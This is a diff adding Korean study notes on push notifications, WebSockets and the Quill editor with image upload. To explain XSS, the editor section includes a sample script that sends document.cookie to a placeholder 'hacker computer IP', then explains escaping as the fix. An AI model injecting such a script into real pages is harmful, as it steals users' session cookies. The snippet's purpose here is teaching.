@@ -1,0 +1,281 @@
+//알림 권한 요청
+requestPermission
+권한을 허용할 것인지, 권한 자체를 물어보는 코드
+
+알림을 받으면 해당 코드가 실행되야함
+버튼을 클릭하면 실행되게 해뒀음
+알림을 받았을 때 동작하는 코드 
+
+
+
+
+//서비스 워커
+이벤트를 주겠음
+push event
+발생했을때 실행하는 코드
+
+서비스 워커가 push event를 받게 되면
+self.addEventLlistener("push", (event) => {
+	console.log("[서비스 워커] 푸시 받음]);
+});
+이 코드를 실행
+
+등록이 되어 있을 수도 있으니 해제하고 새로고침
+Application>Service Worker>Unregister
+
+skipWaiting 떠있으면 적용되는거 기다리는 중이니까 클릭
+
+Push 버튼 눌러봄: 버튼 누르는게 백엔드에서 푸시 메세지를 보내줘야함. 
+근데 아직 백엔드가 없으니까 백엔드가 전달해줬다고 치고
+console.log 코드 잘 동작하는지 확인
+
+
+sw.js파일
+self.addEventLlistener("push", (event) => {
+	console.log("[서비스 워커] 푸시 받음]);
+            let title = "test";
+            let options = {
+                body: "body",
+                icon: "common.jpeg",
+                image: "common.jpeg",
+            }
+            self.registration.showNotification(title, options);
+
+});
+
+화면쪽으로 보내주는 코드를 만들어 둠
+푸시 알림을 받으면 알림이 뜸
+
+
+
+
+
+//웹소켓
+http 통신을 정확히 이해해야함
+
+http 가장 큰 단점
+클라이언트가 요청하고 서버가 응답하면 통신이 끝남
+
+서버가 클라이언트한테 뭔갈 전달해주고 싶음
+http는 클라이언트가 요청한걸 서버가 주는 것이지,
+클라이언트가 요청하지 않은 데이터를 서버가 클라이언트한테 주는것이 기본적으로 안됨
+
+서버가 클라이언트한테 뭔갈 전달해주고 싶어서 웹소켓이라는 것을 발견!
+웹소켓이란?
+양방향 통신 가능
+최초 연결한 뒤에는 서버가 원할때 클라이언트한테 데이터를 전송 할 수 있음
+
+알림같은 것도 웹소켓으로 가능하긴 한데. 웹소켓은 푸시 이벤트와 다르게
+항상 있는게 아닌것은 푸시 이벤트로 처리, 항상 주고 받는 것은 웹소켓으로 구현함
+
+
+
+uri
+클라이언트가 이런 주소로 백엔드 서버에 접속하면 이른 기능을 실행하게 시켜주겠다.
+클라이언트와 맞추야하는 부분임
+/asdfasdf 적었으면 클라이언트도 이렇게 내 서버에 접속해야함
+
+setAllowedOrigins
+= CORS
+서버주소와 ip주소가 다를경우 기본적으로 거부하게 되어있다
+모두 allow (허용)해주겠다
+우리 주소에 이 주소로 접속하는 애들은 다 허용해주겟다
+
+웹소켓이라는 객체 생성
+ws://
+앞부분 = 프로토콜
+서버랑 어떤 양식으로 통식하겠다
+지금 http가 아닌 웹소켓으로 통신하겠다
+
+localhost 
+백엔드 서버 ip주소
+8080
+프로그램 찾아가서
+
+/ws/caht
+으로 요청
+
+서버에 잘 연결되면 이 코드가 실행됨	
+	socket.onopen = () => {
+                console.log('Connected to WebSocket');
+            };
+
+
+1) 서버로 메세지가 잘 가는지 실행
+2) 서버쪽에서 보낸 메세지를 클라이언트가 받도록 실행
+3) 한번 해보기 - 받은 메세지가 div 태그에 추가되도록
+우리 눈에는 console에 찍었을 때 json 형식으로 보이지만,
+실제는 어떤 형식인지는 확인해봐야 함
+typeof로 어떤 타입이 저장되어 있는지 확인해볼 수 있음
+
+지금은 모든 사람이 다 메세지를 받아볼 수 있음
+특정 사람들한테만 보내게 하려면 
+어느정도 형식을 만들어서 보냄
+형식은 정해져 있는 것은 아니고 만들어서 사용하면 됨
+
+4) 현재 접속해있는 사용자들 목록 출력해보기
+5) 마우스 커서의 좌표를 보내서 받는 사람에게 마우스의 커서가 표시되게
+
+
+
+
+
+
+//에디터, 에디터+파일 업로드
+입력한거 그대로 보여주게 되면 문제점
+<script> alert("test"); </script>
+글을 조회하는 사람들은 알람이 뜰 것임
+뭐 알람이 뜨는건 무슨 문제냐고 할 수 있겠지만
+
+<script>
+let cookie = document.cookie;
+let socket = new WebSocket("해커 컴퓨터 IP");
+socket.send(cookie);
+</script>
+
+쿠키에 저장되어 있는 정보가 해커 컴퓨터로 보내지게 됨
+중요한 정보를 다 보내버릴 수 있게 됨
+이런 문제가 안생기도록
+js로 접근하는것을 막아야함
+
+막는 방법
+페이지에서는 태그로 보이지만 실제 웹브우저에서는 글자로 표시되는 것
+&lt; &gt; 같은거
+
+WYSIWYG 에디터가 그렇게 해주는 것임
+해줘야할것은 해주고, 안되야하는 건 안되게 하는 것
+
+여러 WYSIWYG 에디터가 있음!
+Quill 에디터 = WYSIWYG 에디터 중 하나
+추가만 해줘도 만들어둔 에디터가 뜸
+
+1) 툴바에 기능 넣기
+설명해주는 설명서대로 넣으면 됨
+필요한 것만 넣고 필요 없는 거는 지우면 됨
+
+2) 에디터에서 이미지 추가할때
+이미지를 웹브라우저에서 추가할때 이미지 파일을 코드로 바꿔서 보여줌
+이 코드를 그대로 백엔드 서버에 저장하게 되면 쓸데 없는 코드를 저장하게 됨으로 낭비가 됨?
+
+이미지 파일의 정보만 따로 저장할 수 있게 설정해줘야함
+이미지에 대한 처리. 를 해야함 이것 또한 만들어둔 기능을 쓰면 됨
+
+3) 이미지 버튼 클릭하면 내 코드가 실행됨
+이미지에 대한 효율적으로 처리하는 코드를 내가 작성해서 효율적으로 처리하겠음
+현재는 console로 찍어보기만 하기 때문에 이미지 선택하는 창이 안뜨는 것이 맞음
+	const showImageUI = () => {
+            console.log("이미지 업로드 함");
+        }
+
+        const toolbar = quill.getModule('toolbar');
+        toolbar.addHandler('image', showImageUI);
+
+
+4) 이미지를 선택하는 창이 뜨도록 코드 작성
+        const showImageUI = () => {
+            console.log("이미지 업로드 함");
+
+            //<input type="file" accept="image/*">
+            const input = document.createElement("input");
+            input.setAttribute("type", "file");
+            input.setAttribute("accept", "image/*"); //이미지만 선택할 수 있도록 제한
+            input.click();
+        }
+
+
+5) 이미지 파일을 선택했을 때 이미지 파일을 가져올 수 있도록 설정
+	const showImageUI = () => {
+		//추가
+            //이미지 선택해서 가져오도록
+            input.onchange = () => {
+                console.log("파일 선택함");
+                const file = input.files[0];
+
+                if (file) { //파일을 잘 가져왔다면 파일의 정보를 출력해봄
+                    console.log(file.name); //파일 이름 출력
+                }
+	}
+
+quill editor는 코드를 바꿔서 웹페이지에 보여주는 걸 사용함 > 이것은 비효율적인 방법임
+백엔드에 업로드하게 시키고
+서버 컴퓨터에 이미지 파일이 저장되게 하고
+그것을 불러오는 형태로 만들어줘야함
+
+파일의 실제 데이터는 백엔드 서버 컴퓨터의 파일로 저장되게 한다.
+파일의 이름만 DB에 저장되게 한다.
+
+
+6) 이미지 파일을 첨부시켜 백엔드에 보내기
+form 태그라기 보다는 form 태그를 이용해서 데이터를 전달했던 것을 생각하면 됨
+
+프론트에서는 서버에 파일을 보낼때는 컨텐트 타입이 바뀌어서 보내져야함. multipart/form-data 이런 식으로
+
+multipart
+데이터 보내는 부분이 여러개로 쪼개져 있다
+알아서 설정됨 운영체제에서
+바운더리마다 바디, 바디, 바디가 여러개 추가된다고 생각 하면됨
+
+원래는 바디가 하나였는데 멀티파트로 바뀌면 바디가 여러개
+엄밀히 말하자면 헤더랑 바디가 여러개
+
+어떻게 생겼는지는 몰라도 되고, 보내는 쪽에서는 바꿔서 보낸다.
+받는 쪽에서는 저렇게 받아야한다!만 알고 있으면 됨
+
+	const showImageUI = () => {
+            //이미지 선택해서 가져오도록
+            input.onchange = async () => {
+                console.log("파일 선택함");
+                const file = input.files[0];
+
+                if (file) { //파일을 잘 가져왔다면 파일의 정보를 출력해봄
+                    console.log(file.name); //파일 이름 출력
+
+                    // 파일의 실제 데이터는 백엔드 서버 컴퓨터의 파일로 저장되게 한다.
+                    // 파일의 이름만 DB에 저장되게 한다.
+                    const formData = new FormData();
+                    formData.append("image", file);
+
+                    const response = await axios.post("http://localhost:8080/upload-image", formData, {
+                        headers: {
+                            "Content-Type": "multipart/form-data"
+                        }
+                    });
+
+                    if (response.data.success) {
+                        const imageUrl = response.data.imageUrl;
+                        quill.insertEmbed(10, 'image', "http://localhost:8080" + imageUrl);
+                    }
+                }
+            }
+	}
+
+
+7) 백엔드 서버에서 파일을 가져와서 파일 업로드 할 수 있도록
+>>지금까지 이걸 한 이유는 파일이 로컬에만 있기 때문에 
+다른 사람이 내가 선택한 사진을 볼 수 없기 때문에 db에는 파일 이름만 저장하고, 
+백엔드 서버에는 파일을 저장해두는 것임!
+
+
+
+
+
+//에디터+웹소켓
+사용자가 변경했을 때
+사용자가 무언가 입력해서 변경했을 때
+1) 웹소켓 연결
+2) 웹소켓으로 메세지 보내기
+quill에서 만들어준 delta를 보냄
+console.log(detal); 몇번째 칸에 넣었다
+
+3) 받는 쪽에서 내용 업데이트
+메세지를 받으면 quill에서 제공하는 메세지를 추가하는 기능을 이용 
+
+
+-----------
+quill의 기능
+text-change 되면
+변경된 내용(delta)을 가져온다
+
+
+
+
